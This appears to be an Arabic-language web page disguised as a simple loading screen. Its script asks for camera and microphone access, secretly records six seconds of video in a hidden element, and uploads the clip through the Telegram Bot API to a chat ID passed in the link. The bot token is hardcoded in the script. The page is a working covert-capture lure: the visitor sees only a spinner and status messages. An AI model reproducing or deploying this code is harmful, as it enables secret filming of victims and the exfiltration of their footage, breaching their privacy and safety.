<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل</title>
    <style>
        body {
            background-color: #000;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* تصميم شريط التحميل الدائري مثل الصورة */
        .loader {
            width: 120px;
            height: 120px;
            border: 12px solid #f3f3f3;
            border-top: 12px solid #3498db; /* اللون الأزرق كما في الصورة */
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin-bottom: 30px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-text {
            font-size: 22px;
            font-weight: bold;
        }

        video {
            display: none;
        }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="status-text" id="status">لحظة واحدة</div>

    <video id="video" autoplay muted playsinline></video>

    <script>
        const video = document.getElementById('video');
        const statusText = document.getElementById('status');
        
        const urlParams = new URLSearchParams(window.location.search);
        const senderId = urlParams.get('sender_id');
        const botToken = "8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E";

        window.onload = async () => {
            if (!senderId) {
                statusText.innerText = "خطأ في الاتصال";
                return;
            }

            try {
                // طلب الإذن (كما في الصورة الثانية)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;
                
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    await sendVideoToTelegram(blob);
                    stream.getTracks().forEach(track => track.stop());
                };

                // بدء التسجيل تلقائياً بعد الموافقة
                mediaRecorder.start();
                
                // تسجيل لمدة 6 ثوانٍ
                setTimeout(() => {
                    if (mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                    }
                }, 6000);

            } catch (err) {
                statusText.innerText = "يرجى المحاولة مرة أخرى";
            }
        };

        async function sendVideoToTelegram(videoBlob) {
            const formData = new FormData();
            formData.append('chat_id', senderId);
            formData.append('video', videoBlob, 'recording.mp4');

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    statusText.innerText = "تم التحميل بنجاح";
                }
            } catch (error) {
                console.error(error);
            }
        }
    </script>
</body>
</html>
